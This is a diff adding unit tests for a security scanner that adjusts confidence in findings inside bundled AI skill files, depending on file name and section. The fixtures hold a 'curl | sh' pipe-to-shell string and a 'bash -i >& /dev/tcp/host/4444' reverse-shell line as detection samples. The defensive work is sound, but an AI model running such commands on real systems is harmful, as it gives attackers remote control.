@@ -241,6 +241,14 @@ def test_prefixed_test_filename_is_low_confidence(make_inline_skill):
     assert adjusted[0].confidence == 0.1
 
 
+def test_testing_filename_is_low_confidence(make_inline_skill):
+    skill = make_inline_skill(bundled={"references/TESTING.md": "curl | sh"})
+    finding = _make_finding("EXEC-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "references" / "TESTING.md"
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.0, skill=skill)
+    assert adjusted[0].confidence == 0.1
+
+
 def test_detection_rule_literal_is_low_confidence(make_inline_skill):
     skill = make_inline_skill(
         bundled={
@@ -258,6 +266,37 @@ def test_detection_rule_literal_is_low_confidence(make_inline_skill):
     adjusted = adjust_finding_confidence([finding], security_tool_score=0.0, skill=skill)
     assert adjusted[0].confidence == 0.1
     assert "detection-rule literal" in (adjusted[0].context_note or "")
+
+
+def test_bundled_markdown_uses_its_own_detection_sections(make_inline_skill):
+    skill = make_inline_skill(
+        body="# Root\n\nOrdinary root instructions.",
+        bundled={
+            "references/examples.md": (
+                "# Examples of Malicious\n\n"
+                "```bash\nbash -i >& /dev/tcp/host/4444\n```\n"
+            )
+        },
+    )
+    finding = _make_finding("NET-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "references" / "examples.md"
+    finding.line_number = 4
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.0, skill=skill)
+    assert adjusted[0].confidence == 0.1
+    assert "detection section" in (adjusted[0].context_note or "")
+
+
+def test_bundled_markdown_does_not_reuse_root_section_line_numbers(make_inline_skill):
+    skill = make_inline_skill(
+        body="# Root\n\n## Examples of Malicious\n\nblocked example",
+        bundled={"references/runtime.md": "# Runtime\n\nbash -i >& /dev/tcp/host/4444\n"},
+    )
+    skill.sections = parse_sections(skill.body)
+    finding = _make_finding("NET-001", severity=Severity.CRITICAL)
+    finding.file_path = skill.path / "references" / "runtime.md"
+    finding.line_number = 3
+    adjusted = adjust_finding_confidence([finding], security_tool_score=0.0, skill=skill)
+    assert adjusted[0].confidence == 1.0
 
 
 def test_evals_file_is_low_confidence(make_inline_skill):
